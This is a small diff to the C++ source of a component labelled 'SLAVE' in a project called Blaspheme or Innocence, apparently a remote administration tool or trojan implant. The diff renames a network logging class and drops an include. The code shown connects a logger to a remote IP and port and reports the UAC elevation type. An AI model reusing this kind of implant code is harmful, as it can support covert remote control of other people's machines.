@@ -3,8 +3,7 @@
 HANDLE threadHandle;
 
 #include <blaspheme/Blaspheme.hpp>
-#include <common/Convert.hpp>
-#include <common/Logger.hpp>
+#include <common/Log.hpp>
 #include <blaspheme/protocol/ConnectionInfo.hpp>
 #include <network/Pipe.hpp>
 #include <system/Uac.hpp>
@@ -40,7 +39,7 @@ DWORD WINAPI Run(void)
 {
 	LOG.setHeader("SLAVE");
 #ifdef INNOCENCE_DEBUG
-    //LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
+    //LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
 #endif
 
 	// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
@@ -72,7 +71,7 @@ DWORD WINAPI Run(void)
 		SHOW_FATAL_ERROR("Impossible de se connecter au PIPE.");
 	}
 
-    LOG.addObserver(new Common::LoggingNetwork(infos.ip, infos.port));
+    LOG.addObserver(new Common::LogToNetwork(infos.ip, infos.port));
 	LOG << GetElevationType();
     InhibitionCore::instance().set_connection_infos(infos);
 	try
